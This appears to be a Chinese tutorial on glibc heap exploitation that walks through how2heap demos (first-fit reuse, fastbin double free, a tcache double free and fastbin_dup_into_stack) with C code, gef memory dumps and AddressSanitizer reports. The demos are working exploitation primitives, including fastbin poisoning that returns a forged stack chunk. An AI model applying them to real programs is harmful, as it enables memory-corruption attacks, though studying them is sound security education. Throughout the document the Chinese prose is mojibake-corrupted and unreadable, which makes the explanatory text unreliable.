<p>è¿™ç¬¬ä¸€ä¸ªç¨‹åºå±•ç¤ºäº† glibc å †åˆ†é…çš„ç­–ç•¥ï¼Œå³ first-fitã€‚åœ¨åˆ†é…å†…å­˜æ—¶ï¼Œmalloc ä¼šå…ˆåˆ° unsorted binï¼ˆæˆ–è€…fastbinsï¼‰ ä¸­æŸ¥æ‰¾é€‚åˆçš„è¢« free çš„ chunkï¼Œå¦‚æžœæ²¡æœ‰ï¼Œå°±ä¼šæŠŠ unsorted bin ä¸­çš„æ‰€æœ‰ chunk åˆ†åˆ«æ”¾å…¥åˆ°æ‰€å±žçš„ bins ä¸­ï¼Œç„¶åŽå†åŽ»è¿™äº› bins é‡ŒåŽ»æ‰¾åˆé€‚çš„ chunkã€‚å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰æ¬¡ malloc çš„åœ°å€å’Œç¬¬ä¸€æ¬¡ç›¸åŒï¼Œå³ malloc æ‰¾åˆ°äº†ç¬¬ä¸€æ¬¡ free æŽ‰çš„ chunkï¼Œå¹¶æŠŠå®ƒé‡æ–°åˆ†é…ã€‚</p>
<p>åœ¨ gdb ä¸­è°ƒè¯•ï¼Œä¸¤ä¸ª malloc ä¹‹åŽï¼ˆchunk ä½äºŽ malloc è¿”å›žåœ°å€å‡åŽ» 0x10 çš„ä½ç½®ï¼‰ï¼š</p>
<pre><code class="language-text">gefâž¤  x/5gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000211 &lt;-- chunk a
0x602010:   0x4141414141414141  0x0000000000000000
0x602020:   0x0000000000000000
gefâž¤  x/5gx 0x602220-0x10
0x602210:   0x0000000000000000  0x0000000000000111 &lt;-- chunk b
0x602220:   0x4242424242424242  0x0000000000000000
0x602230:   0x0000000000000000
</code></pre>
<p>ç¬¬ä¸€ä¸ª free ä¹‹åŽï¼Œå°†å…¶åŠ å…¥åˆ° unsorted bin ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/5gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000211 &lt;-- chunk a [be freed]
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78      &lt;-- fd pointer, bk pointer
0x602020:   0x0000000000000000
gefâž¤  x/5gx 0x602220-0x10
0x602210:   0x0000000000000210  0x0000000000000110 &lt;-- chunk b
0x602220:   0x4242424242424242  0x0000000000000000
0x602230:   0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 â†’   Chunk(addr=0x602010, size=0x210, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
</code></pre>
<p>ç¬¬ä¸‰ä¸ª malloc ä¹‹åŽï¼š</p>
<pre><code class="language-text">gefâž¤  x/5gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000211 &lt;-- chunk c
0x602010:   0x4343434343434343  0x00007ffff7dd1d00
0x602020:   0x0000000000000000
gefâž¤  x/5gx 0x602220-0x10
0x602210:   0x0000000000000210  0x0000000000000111 &lt;-- chunk b
0x602220:   0x4242424242424242  0x0000000000000000
0x602230:   0x0000000000000000
</code></pre>
<p>æ‰€ä»¥å½“é‡Šæ”¾ä¸€å—å†…å­˜åŽå†ç”³è¯·ä¸€å—å¤§å°ç•¥å°äºŽçš„ç©ºé—´ï¼Œé‚£ä¹ˆ glibc å€¾å‘äºŽå°†å…ˆå‰è¢«é‡Šæ”¾çš„ç©ºé—´é‡æ–°åˆ†é…ã€‚</p>
<p>å¥½äº†ï¼ŒçŽ°åœ¨æˆ‘ä»¬åŠ ä¸Šå†…å­˜æ£€æµ‹å‚æ•°é‡æ–°ç¼–è¯‘ï¼š</p>
<pre><code class="language-text">$ gcc -fsanitize=address -g first_fit.c
$ ./a.out
1st malloc(512): 0x61500000fd00
2nd malloc(256): 0x611000009f00
first allocation 0x61500000fd00 points to AAAAAAAA
Freeing the first one...
3rd malloc(500): 0x61500000fa80
3rd allocation 0x61500000fa80 points to CCCCCCCC
=================================================================
==4525==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500000fd00 at pc 0x7f49d14a61e9 bp 0x7ffe40b526e0 sp 0x7ffe40b51e58
READ of size 2 at 0x61500000fd00 thread T0
    #0 0x7f49d14a61e8  (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x601e8)
    #1 0x7f49d14a6bcc in vfprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60bcc)
    #2 0x7f49d14a6cf9 in fprintf (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x60cf9)
    #3 0x400b8b in main /home/firmy/how2heap/first_fit.c:23
    #4 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #5 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878)

0x61500000fd00 is located 0 bytes inside of 512-byte region [0x61500000fd00,0x61500000ff00)
freed by thread T0 here:
    #0 0x7f49d14de2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)
    #1 0x400aa2 in main /home/firmy/how2heap/first_fit.c:17
    #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

previously allocated by thread T0 here:
    #0 0x7f49d14de602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x400957 in main /home/firmy/how2heap/first_fit.c:6
    #2 0x7f49d109c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
</code></pre>
<p>ä¸€ä¸ªå¾ˆæ˜Žæ˜¾çš„ use-after-free æ¼æ´žã€‚å…³äºŽè¿™ç±»æ¼æ´žçš„è¯¦ç»†åˆ©ç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¼šåœ¨åŽé¢çš„ç« èŠ‚é‡Œå†è®²ã€‚</p>
<h3 id="fastbin_dup">fastbin_dup</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main() {
    fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);
    char *a = malloc(9);
    char *b = malloc(9);
    char *c = malloc(9);
    strcpy(a, &quot;AAAAAAAA&quot;);
    strcpy(b, &quot;BBBBBBBB&quot;);
    strcpy(c, &quot;CCCCCCCC&quot;);
    fprintf(stderr, &quot;1st malloc(9) %p points to %s\n&quot;, a, a);
    fprintf(stderr, &quot;2nd malloc(9) %p points to %s\n&quot;, b, b);
    fprintf(stderr, &quot;3rd malloc(9) %p points to %s\n&quot;, c, c);

    fprintf(stderr, &quot;Freeing the first one %p.\n&quot;, a);
    free(a);
    fprintf(stderr, &quot;Then freeing another one %p.\n&quot;, b);
    free(b);
    fprintf(stderr, &quot;Freeing the first one %p again.\n&quot;, a);
    free(a);

    fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);
    char *d = malloc(9);
    char *e = malloc(9);
    char *f = malloc(9);
    strcpy(d, &quot;DDDDDDDD&quot;);
    fprintf(stderr, &quot;4st malloc(9) %p points to %s the first time\n&quot;, d, d);
    strcpy(e, &quot;EEEEEEEE&quot;);
    fprintf(stderr, &quot;5nd malloc(9) %p points to %s\n&quot;, e, e);
    strcpy(f, &quot;FFFFFFFF&quot;);
    fprintf(stderr, &quot;6rd malloc(9) %p points to %s the second time\n&quot;, f, f);
}
$ gcc -g fastbin_dup.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0x1c07010 points to AAAAAAAA
2nd malloc(9) 0x1c07030 points to BBBBBBBB
3rd malloc(9) 0x1c07050 points to CCCCCCCC
Freeing the first one 0x1c07010.
Then freeing another one 0x1c07030.
Freeing the first one 0x1c07010 again.
Allocating 3 buffers.
4st malloc(9) 0x1c07010 points to DDDDDDDD the first time
5nd malloc(9) 0x1c07030 points to EEEEEEEE
6rd malloc(9) 0x1c07010 points to FFFFFFFF the second time
</code></pre>
<p>è¿™ä¸ªç¨‹åºå±•ç¤ºäº†åˆ©ç”¨ fastbins çš„ double-free æ”»å‡»ï¼Œå¯ä»¥æ³„æ¼å‡ºä¸€å—å·²ç»è¢«åˆ†é…çš„å†…å­˜æŒ‡é’ˆã€‚fastbins å¯ä»¥çœ‹æˆä¸€ä¸ª LIFO çš„æ ˆï¼Œä½¿ç”¨å•é“¾è¡¨å®žçŽ°ï¼Œé€šè¿‡ fastbin-&gt;fd æ¥éåŽ† fastbinsã€‚ç”±äºŽ free çš„è¿‡ç¨‹ä¼šå¯¹ free list åšæ£€æŸ¥ï¼Œæˆ‘ä»¬ä¸èƒ½è¿žç»­ä¸¤æ¬¡ free åŒä¸€ä¸ª chunkï¼Œæ‰€ä»¥è¿™é‡Œåœ¨ä¸¤æ¬¡ free ä¹‹é—´ï¼Œå¢žåŠ äº†ä¸€æ¬¡å¯¹å…¶ä»– chunk çš„ free è¿‡ç¨‹ï¼Œä»Žè€Œç»•è¿‡æ£€æŸ¥é¡ºåˆ©æ‰§è¡Œã€‚ç„¶åŽå† malloc ä¸‰æ¬¡ï¼Œå°±åœ¨åŒä¸€ä¸ªåœ°å€ malloc äº†ä¸¤æ¬¡ï¼Œä¹Ÿå°±æœ‰äº†ä¸¤ä¸ªæŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆã€‚</p>
<p>libc-2.23 ä¸­å¯¹ double-free çš„æ£€æŸ¥è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="language-c">    /* Check that the top of the bin is not the record we are going to add
       (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
      }
</code></pre>
<p>å®ƒåœ¨æ£€æŸ¥ fast bin çš„ double-free æ—¶åªæ˜¯æ£€æŸ¥äº†ç¬¬ä¸€ä¸ªå—ã€‚æ‰€ä»¥å…¶å®žæ˜¯å­˜åœ¨ç¼ºé™·çš„ã€‚</p>
<p>ä¸‰ä¸ª malloc ä¹‹åŽï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a
0x602010:   0x4141414141414141  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1 &lt;-- top chunk
0x602070:   0x0000000000000000
</code></pre>
<p>ç¬¬ä¸€ä¸ª free ä¹‹åŽï¼Œchunk a è¢«æ·»åŠ åˆ° fastbins ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed]
0x602010:   0x0000000000000000  0x0000000000000000      &lt;-- fd pointer
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
</code></pre>
<p>ç¬¬äºŒä¸ª free ä¹‹åŽï¼Œchunk b è¢«æ·»åŠ åˆ° fastbins ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed]
0x602010:   0x0000000000000000  0x0000000000000000      &lt;-- fd pointer
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
</code></pre>
<p>æ­¤æ—¶ç”±äºŽ chunk a å¤„äºŽ bin ä¸­ç¬¬ 2 å—çš„ä½ç½®ï¼Œä¸ä¼šè¢« double-free çš„æ£€æŸ¥æœºåˆ¶æ£€æŸ¥å‡ºæ¥ã€‚æ‰€ä»¥ç¬¬ä¸‰ä¸ª free ä¹‹åŽï¼Œchunk a å†æ¬¡è¢«æ·»åŠ åˆ° fastbins ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed again]
0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  â†’  [loop detected]
</code></pre>
<p>æ­¤æ—¶ chunk a å’Œ chunk b ä¼¼ä¹Žå½¢æˆäº†ä¸€ä¸ªçŽ¯ã€‚</p>
<p>å†ä¸‰ä¸ª malloc ä¹‹åŽï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk d, chunk f
0x602010:   0x4646464646464646  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk e
0x602030:   0x4545454545454545  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
</code></pre>
<p>æ‰€ä»¥å¯¹äºŽ fastbinsï¼Œå¯ä»¥é€šè¿‡ double-free æ³„æ¼å‡ºä¸€ä¸ªå †å—çš„æŒ‡é’ˆã€‚</p>
<p>åŠ ä¸Šå†…å­˜æ£€æµ‹å‚æ•°é‡æ–°ç¼–è¯‘ï¼š</p>
<pre><code class="language-text">$ gcc -fsanitize=address -g fastbin_dup.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0x60200000eff0 points to AAAAAAAA
2nd malloc(9) 0x60200000efd0 points to BBBBBBBB
3rd malloc(9) 0x60200000efb0 points to CCCCCCCC
Freeing the first one 0x60200000eff0.
Then freeing another one 0x60200000efd0.
Freeing the first one 0x60200000eff0 again.
=================================================================
==5650==ERROR: AddressSanitizer: attempting double-free on 0x60200000eff0 in thread T0:
    #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)
    #1 0x400ba3 in main /home/firmy/how2heap/fastbin_dup.c:22
    #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #3 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878)

0x60200000eff0 is located 0 bytes inside of 9-byte region [0x60200000eff0,0x60200000eff9)
freed by thread T0 here:
    #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)
    #1 0x400b0d in main /home/firmy/how2heap/fastbin_dup.c:18
    #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

previously allocated by thread T0 here:
    #0 0x7fdc18ebf602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x400997 in main /home/firmy/how2heap/fastbin_dup.c:7
    #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
</code></pre>
<p>ä¸€ä¸ªå¾ˆæ˜Žæ˜¾çš„ double-free æ¼æ´žã€‚å…³äºŽè¿™ç±»æ¼æ´žçš„è¯¦ç»†åˆ©ç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¼šåœ¨åŽé¢çš„ç« èŠ‚é‡Œå†è®²ã€‚</p>
<p>çœ‹ä¸€ç‚¹æ–°é²œçš„ï¼Œåœ¨ libc-2.26 ä¸­ï¼Œå³ä½¿ä¸¤æ¬¡ freeï¼Œä¹Ÿå¹¶æ²¡æœ‰è§¦å‘ double-free çš„å¼‚å¸¸æ£€æµ‹ï¼Œè¿™ä¸Ž tcache æœºåˆ¶æœ‰å…³ï¼Œä»¥åŽä¼šè¯¦ç»†è®²è¿°ã€‚è¿™é‡Œå…ˆçœ‹ä¸ªèƒ½å¤Ÿåœ¨è¯¥ç‰ˆæœ¬ä¸‹è§¦å‘ double-free çš„ä¾‹å­ï¼š</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    int i;

    void *p = malloc(0x40);
    fprintf(stderr, &quot;First allocate a fastbin: p=%p\n&quot;, p);

    fprintf(stderr, &quot;Then free(p) 7 times\n&quot;);
    for (i = 0; i &lt; 7; i++) {
        fprintf(stderr, &quot;free %d: %p =&gt; %p\n&quot;, i+1, &amp;p, p);
        free(p);
    }

    fprintf(stderr, &quot;Then malloc 8 times at the same address\n&quot;);
    int *a[10];
    for (i = 0; i &lt; 8; i++) {
        a[i] = malloc(0x40);
        fprintf(stderr, &quot;malloc %d: %p =&gt; %p\n&quot;, i+1, &amp;a[i], a[i]);
    }

    fprintf(stderr, &quot;Finally trigger double-free\n&quot;);
    for (i = 0; i &lt; 2; i++) {
        fprintf(stderr, &quot;free %d: %p =&gt; %p\n&quot;, i+1, &amp;a[i], a[i]);
        free(a[i]);
    }
}
$ gcc -g tcache_double-free.c
$ ./a.out
First allocate a fastbin: p=0x559e30950260
Then free(p) 7 times
free 1: 0x7ffc498b2958 =&gt; 0x559e30950260
free 2: 0x7ffc498b2958 =&gt; 0x559e30950260
free 3: 0x7ffc498b2958 =&gt; 0x559e30950260
free 4: 0x7ffc498b2958 =&gt; 0x559e30950260
free 5: 0x7ffc498b2958 =&gt; 0x559e30950260
free 6: 0x7ffc498b2958 =&gt; 0x559e30950260
free 7: 0x7ffc498b2958 =&gt; 0x559e30950260
Then malloc 8 times at the same address
malloc 1: 0x7ffc498b2960 =&gt; 0x559e30950260
malloc 2: 0x7ffc498b2968 =&gt; 0x559e30950260
malloc 3: 0x7ffc498b2970 =&gt; 0x559e30950260
malloc 4: 0x7ffc498b2978 =&gt; 0x559e30950260
malloc 5: 0x7ffc498b2980 =&gt; 0x559e30950260
malloc 6: 0x7ffc498b2988 =&gt; 0x559e30950260
malloc 7: 0x7ffc498b2990 =&gt; 0x559e30950260
malloc 8: 0x7ffc498b2998 =&gt; 0x559e30950260
Finally trigger double-free
free 1: 0x7ffc498b2960 =&gt; 0x559e30950260
free 2: 0x7ffc498b2968 =&gt; 0x559e30950260
double free or corruption (fasttop)
[2]    1244 abort (core dumped)  ./a.out
</code></pre>
<h3 id="fastbin_dup_into_stack">fastbin_dup_into_stack</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main() {
    unsigned long long stack_var = 0x21;
    fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);
    char *a = malloc(9);
    char *b = malloc(9);
    char *c = malloc(9);
    strcpy(a, &quot;AAAAAAAA&quot;);
    strcpy(b, &quot;BBBBBBBB&quot;);
    strcpy(c, &quot;CCCCCCCC&quot;);
    fprintf(stderr, &quot;1st malloc(9) %p points to %s\n&quot;, a, a);
    fprintf(stderr, &quot;2nd malloc(9) %p points to %s\n&quot;, b, b);
    fprintf(stderr, &quot;3rd malloc(9) %p points to %s\n&quot;, c, c);

    fprintf(stderr, &quot;Freeing the first one %p.\n&quot;, a);
    free(a);
    fprintf(stderr, &quot;Then freeing another one %p.\n&quot;, b);
    free(b);
    fprintf(stderr, &quot;Freeing the first one %p again.\n&quot;, a);
    free(a);

    fprintf(stderr, &quot;Allocating 4 buffers.\n&quot;);
    unsigned long long *d = malloc(9);
    *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));
    fprintf(stderr, &quot;4nd malloc(9) %p points to %p\n&quot;, d, &amp;d);
    char *e = malloc(9);
    strcpy(e, &quot;EEEEEEEE&quot;);
    fprintf(stderr, &quot;5nd malloc(9) %p points to %s\n&quot;, e, e);
    char *f = malloc(9);
    strcpy(f, &quot;FFFFFFFF&quot;);
    fprintf(stderr, &quot;6rd malloc(9) %p points to %s\n&quot;, f, f);
    char *g = malloc(9);
    strcpy(g, &quot;GGGGGGGG&quot;);
    fprintf(stderr, &quot;7th malloc(9) %p points to %s\n&quot;, g, g);
}
$ gcc -g fastbin_dup_into_stack.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0xcf2010 points to AAAAAAAA
2nd malloc(9) 0xcf2030 points to BBBBBBBB
3rd malloc(9) 0xcf2050 points to CCCCCCCC
Freeing the first one 0xcf2010.
Then freeing another one 0xcf2030.
Freeing the first one 0xcf2010 again.
Allocating 4 buffers.
4nd malloc(9) 0xcf2010 points to 0x7ffd1e0d48b0
5nd malloc(9) 0xcf2030 points to EEEEEEEE
6rd malloc(9) 0xcf2010 points to FFFFFFFF
7th malloc(9) 0x7ffd1e0d48b0 points to GGGGGGGG
</code></pre>
<p>è¿™ä¸ªç¨‹åºå±•ç¤ºäº†æ€Žæ ·é€šè¿‡ä¿®æ”¹ fd æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„ free chunkï¼Œåœ¨ä¼ªé€ çš„åœ°å€å¤„ malloc å‡ºä¸€ä¸ª chunkã€‚è¯¥ç¨‹åºå¤§éƒ¨åˆ†å†…å®¹éƒ½å’Œä¸Šä¸€ä¸ªç¨‹åºä¸€æ ·ï¼Œæ¼æ´žä¹ŸåŒæ ·æ˜¯ double-freeï¼Œåªæœ‰ç»™ fd å¡«å……çš„å†…å®¹ä¸ä¸€æ ·ã€‚</p>
<p>ä¸‰ä¸ª malloc ä¹‹åŽï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a
0x602010:   0x4141414141414141  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1 &lt;-- top chunk
0x602070:   0x0000000000000000
</code></pre>
<p>ä¸‰ä¸ª free ä¹‹åŽï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]
0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  â†’  [loop detected]
</code></pre>
<p>è¿™ä¸€æ¬¡ malloc ä¹‹åŽï¼Œæˆ‘ä»¬ä¸å†å¡«å……æ— æ„ä¹‰çš„ "DDDDDDDD"ï¼Œè€Œæ˜¯å¡«å……ä¸€ä¸ªåœ°å€ï¼Œå³æ ˆåœ°å€å‡åŽ» 0x8ï¼Œä»Žè€Œåœ¨æ ˆä¸Šä¼ªé€ å‡ºä¸€ä¸ª free çš„ chunkï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„åœ°å€ï¼‰ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ <code>stack_var</code> è¢«æˆ‘ä»¬è®¾ç½®ä¸º <code>0x21</code>ï¼ˆæˆ–<code>0x20</code>éƒ½å¯ä»¥ï¼‰ï¼Œå…¶å®žæ˜¯ä¸ºäº†åœ¨æ ˆåœ°å€å‡åŽ» 0x8 çš„æ—¶å€™ä½œä¸º fake chunk çš„ size å­—æ®µã€‚</p>
<p>glibc åœ¨æ‰§è¡Œåˆ†é…æ“ä½œæ—¶ï¼Œè‹¥å—çš„å¤§å°ç¬¦åˆ fast binï¼Œåˆ™ä¼šåœ¨å¯¹åº”çš„ bin ä¸­å¯»æ‰¾åˆé€‚çš„å—ï¼Œæ­¤æ—¶ glibc å°†æ ¹æ®å€™é€‰å—çš„ size å­—æ®µè®¡ç®—å‡º fastbin ç´¢å¼•ï¼Œç„¶åŽä¸Žå¯¹åº” bin åœ¨ fastbin ä¸­çš„ç´¢å¼•è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœäºŒè€…ä¸åŒ¹é…ï¼Œåˆ™è¯´æ˜Žå—çš„ size å­—æ®µé­åˆ°ç ´åã€‚æ‰€ä»¥éœ€è¦ fake chunk çš„ size å­—æ®µè¢«è®¾ç½®ä¸ºæ­£ç¡®çš„å€¼ã€‚</p>
<pre><code class="language-c">/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)

  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      [...]

      if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = &quot;malloc(): memory corruption (fast)&quot;;
              [...]
            }
            [...]
        }
    }
</code></pre>
<p>ç®€å•åœ°è¯´å°±æ˜¯ fake chunk çš„ size ä¸Ž double-free çš„ chunk çš„ size ç›¸åŒå³å¯ã€‚</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk d
0x602010:   0x00007fffffffdc30  0x0000000000000000      &lt;-- fd pointer
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
gefâž¤  p &amp;stack_var
$4 = (unsigned long long *) 0x7fffffffdc38
gefâž¤  x/5gx 0x7fffffffdc38-0x8
0x7fffffffdc30: 0x0000000000000000  0x0000000000000021 &lt;-- fake chunk [seems to be freed]
0x7fffffffdc40: 0x0000000000602010  0x0000000000602010      &lt;-- fd pointer
0x7fffffffdc50: 0x0000000000602030
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index]
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä¼ªé€ çš„ chunk å·²ç»ç”±æŒ‡é’ˆé“¾æŽ¥åˆ° fastbins ä¸Šäº†ã€‚ä¹‹åŽ malloc ä¸¤æ¬¡ï¼Œå³å¯å°†ä¼ªé€ çš„ chunk ç§»åŠ¨åˆ°é“¾è¡¨å¤´éƒ¨ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x4646464646464646  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021
0x602030:   0x4545454545454545  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000021
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE)  â†  Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index]
</code></pre>
<p>å†æ¬¡ mallocï¼Œå³å¯åœ¨ fake chunk å¤„åˆ†é…å†…å­˜ï¼š</p>
<pre><code class="language-text">gefâž¤  x/5gx 0x7fffffffdc38-0x8
0x7fffffffdc30: 0x0000000000000000  0x0000000000000021 &lt;-- fake chunk
0x7fffffffdc40: 0x4747474747474747  0x0000000000602000
0x7fffffffdc50: 0x0000000000602030
</code></pre>
